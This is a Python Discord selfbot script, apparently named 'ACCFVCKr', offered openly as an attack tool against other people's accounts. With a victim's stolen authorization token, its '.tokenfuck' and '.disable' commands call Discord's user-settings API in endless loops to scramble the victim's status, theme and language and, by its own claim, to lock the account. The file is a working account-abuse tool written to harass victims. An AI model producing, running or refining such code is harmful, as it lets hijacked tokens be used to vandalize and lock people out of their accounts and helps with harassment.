import requests, time, json, os, random, ctypes
from discord.ext import commands
from colorama import Fore



"""
 ______     ______     ______        ______   __   __   ______     __  __     ______     ______    
/\  __ \   /\  ___\   /\  ___\      /\  ___\ /\ \ / /  /\  ___\   /\ \/ /    /\  ___\   /\  == \   
\ \  __ \  \ \ \____  \ \ \____     \ \  __\ \ \ \'/   \ \ \____  \ \  _"-.  \ \  __\   \ \  __<   
 \ \_\ \_\  \ \_____\  \ \_____\     \ \_\    \ \__|    \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\ 
  \/_/\/_/   \/_____/   \/_____/      \/_/     \/_/      \/_____/   \/_/\/_/   \/_____/   \/_/ /_/ 
      by nextrix#8446                                                                                             
"""

with open('config.json') as f:
    config = json.load(f)

token_var = config.get("TOKEN")
target_token = ""

#clear console
def clear():
    os.system("cls")

ctypes.windll.kernel32.SetConsoleTitleW("ACCFVCKr by nextrix#8446")

#languages
regions = (
    "da",
    "ge",
    "es",
    "fr",
    "cr",
    "it",
    "li",
    "hu",
    "du",
    "no",
    "po",
    "po-BR",
    "ro-RO",
    "fi",
    "sw",
    "vi",
    "tu",
    "cz",
    "gr",
    "bu",
    "ru",
    "uk",
    "hi",
    "th",
    "ch-CH",
    "ja",
    "ch-TA",
    "ko"
    )

type = (
    "dnd",
    "online",
    "idle",
    "offline"
    )

bot = commands.Bot(command_prefix=".", self_bot=True)



clear()
print(

        f"\n{Fore.CYAN}[]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[]\n"
        f"\n{Fore.RED}    ______     ______     ______        ______   __   __   ______     __  __     ______     ______    \n",
        f"  /\  __ \   /\  ___\   /\  ___\      /\  ___\ /\ \ / /  /\  ___\   /\ \/ /    /\  ___\   /\  == \   \n",
        f'  \ \  __ \  \ \ \____  \ \ \____     \ \  __\ \ \ \ /   \ \ \____  \ \  _`-.  \ \  __\   \ \  __<   \n',
        f"   \ \_\ \_\  \ \_____\  \ \_____\     \ \_\    \ \__|    \ \_____\  \ \_\ \_\  \ \_____\  \ \_\ \_\ \n",
        f"    \/_/\/_/   \/_____/   \/_____/      \/_/     \/_/      \/_____/   \/_/\/_/   \/_____/   \/_/ /_/ \n",
        f"\n{Fore.MAGENTA}            by nextrix#8446\n",
        f"\n{Fore.CYAN}[]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[]"                                                                                    
    
    
    
        )
    

time.sleep(0.1)
status1 = input(f"\n{Fore.BLUE}What do you want their first custom status to say? {Fore.LIGHTBLUE_EX}>>{Fore.LIGHTBLACK_EX}\t")
status2 = input(f"\n{Fore.GREEN}What do you want their second custom status to say? {Fore.LIGHTGREEN_EX}>>{Fore.LIGHTBLACK_EX}\t")

print("\nSet options:")
time.sleep(0.2)
print(f"{Fore.BLUE}   Status 1 = {Fore.LIGHTBLUE_EX}"+status1)
time.sleep(0.15)
print(f"{Fore.GREEN}   Status 2 = {Fore.LIGHTGREEN_EX}"+status2)
time.sleep(0.15)
enter = input(f"\n{Fore.RED}Press enter to continue {Fore.LIGHTRED_EX}>>{Fore.LIGHTBLACK_EX}\t")
clear()

@bot.event
async def on_ready():
    ctypes.windll.kernel32.SetConsoleTitleW("Connected to discord account!")
    print(f"{Fore.CYAN}[]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[]\n")
    print(f"{Fore.GREEN}  Connected!")
    print(f"\n{Fore.YELLOW}  Commands avalible (no brackets if used):")
    print(f"{Fore.CYAN}     .tokenfuck <VICTUM'S TOKEN>    (info: really, really fucks up their account lmao.)")
    print(f"{Fore.RED}     .disable <VICTUM'S TOKEN>    (info: this disables their account until they reset their password.)\n")
    print(f"{Fore.CYAN}[]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[]")

@bot.command()
async def tokenfuck(ctx, target_token):
    ctypes.windll.kernel32.SetConsoleTitleW("Fvcking their shit lmao")
    await ctx.send(target_token)
    while True:
        cstatus = random.choice(type)
        cstatus2 = random.choice(type)
        language = random.choice(regions)
        language2 = random.choice(regions)
        content = {
                    "custom_status": {"text": str(status1)},
                    "status": cstatus,
                    "theme": "dark",
                    "locale": str(language)
                }

        r = requests.patch("https://ptb.discordapp.com/api/v6/users/@me/settings", headers={'authorization':target_token}, json=content)
        clear()
        print(f"{Fore.MAGENTA}Set status to {Fore.GREEN}" + cstatus + f"\n{Fore.MAGENTA}Set theme to {Fore.LIGHTBLACK_EX}Dark\n" + f"{Fore.MAGENTA}set the custom status to say {Fore.YELLOW}" + status1 + f"\n{Fore.MAGENTA}Set language to {Fore.CYAN}" + language + "\n")
        print(f"\n{Fore.RED}Victum's Token set to {Fore.LIGHTRED_EX}"+ target_token +"\n")
        print(
        f"\n{Fore.RED} ███████╗██╗  ██╗████████╗ ██████╗ ██████╗ ████████╗███████╗██████╗ \n",
        f"{Fore.RED}██╔════╝╚██╗██╔╝╚══██╔══╝██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██╔══██╗\n",
        f"{Fore.RED}█████╗   ╚███╔╝    ██║   ██║   ██║██████╔╝   ██║   █████╗  ██║  ██║\n",
        f"{Fore.RED}██╔══╝   ██╔██╗    ██║   ██║   ██║██╔══██╗   ██║   ██╔══╝  ██║  ██║\n",
        f"{Fore.RED}███████╗██╔╝ ██╗   ██║   ╚██████╔╝██║  ██║   ██║   ███████╗██████╔╝\n",
        f"{Fore.RED}╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝ \n",
        f"{Fore.RED}\n"
        
                                                                   
        
        
        )
        time.sleep(1.5)
        
        
        content = {
                    "custom_status": {"text": str(status2)},
                    "status": cstatus2,
                    "theme": "light",
                    "locale": language2

                }
        r = requests.patch("https://ptb.discordapp.com/api/v6/users/@me/settings", headers={'authorization':target_token}, json=content)
        clear()
        print(f"{Fore.MAGENTA}Set status to {Fore.GREEN}" + cstatus2 + f"{Fore.MAGENTA}\nSet theme to {Fore.WHITE}Light\n" + f"{Fore.MAGENTA}set the custom status to say {Fore.YELLOW}" + status2 + f"\n{Fore.MAGENTA}Set language to {Fore.CYAN}" + language2 + "\n")
        print(f"\n{Fore.RED}Victum's Token set to {Fore.LIGHTRED_EX}"+ target_token +"\n")
        print(
        
        f"{Fore.RED}\n",
        f"{Fore.RED}███╗   ██╗███████╗██╗  ██╗████████╗██████╗ ██╗██╗  ██╗             \n",
        f"{Fore.RED}████╗  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██║╚██╗██╔╝             \n",
        f"{Fore.RED}██╔██╗ ██║█████╗   ╚███╔╝    ██║   ██████╔╝██║ ╚███╔╝              \n",
        f"{Fore.RED}██║╚██╗██║██╔══╝   ██╔██╗    ██║   ██╔══██╗██║ ██╔██╗              \n",
        f"{Fore.RED}██║ ╚████║███████╗██╔╝ ██╗   ██║   ██║  ██║██║██╔╝ ██╗             \n",
        f"{Fore.RED}╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝             #8446\n"
                                                                   
        
        
        )
        #print(r.content)
        time.sleep(1.5)

@bot.command
async def disable(ctx, target_token):
    ctypes.windll.kernel32.SetConsoleTitleW("Their account go bye-bye!")
    while True:
        cstatus = random.choice(type)
        cstatus2 = random.choice(type)
        content = {
                        "custom_status": {"text": str(status1)},
                        "status": cstatus,
                  }
        print(f"{Fore.MAGENTA}Set status to {Fore.GREEN}" + cstatus + f"\n" + f"{Fore.MAGENTA}set the custom status to say {Fore.YELLOW}" + status1 + "\n")
        print(f"\n{Fore.RED}Victum's Token set to {Fore.LIGHTRED_EX}"+ target_token +"\n")
        r = requests.patch("https://ptb.discordapp.com/api/v6/users/@me/settings", headers={'authorization':target_token}, json=content)
        time.sleep(0.1)
        content = {
                        "custom_status": {"text": str(status2)},
                        "status": cstatus2,
                  }
        print(f"{Fore.MAGENTA}Set status to {Fore.GREEN}" + cstatus2 + f"\n" + f"{Fore.MAGENTA}set the custom status to say {Fore.YELLOW}" + status2 + "\n")
        print(f"\n{Fore.RED}Victum's Token set to {Fore.LIGHTRED_EX}"+ target_token +"\n")
        r = requests.patch("https://ptb.discordapp.com/api/v6/users/@me/settings", headers={'authorization':target_token}, json=content)
        time.sleep(0.1)

bot.run(token_var, bot=False)


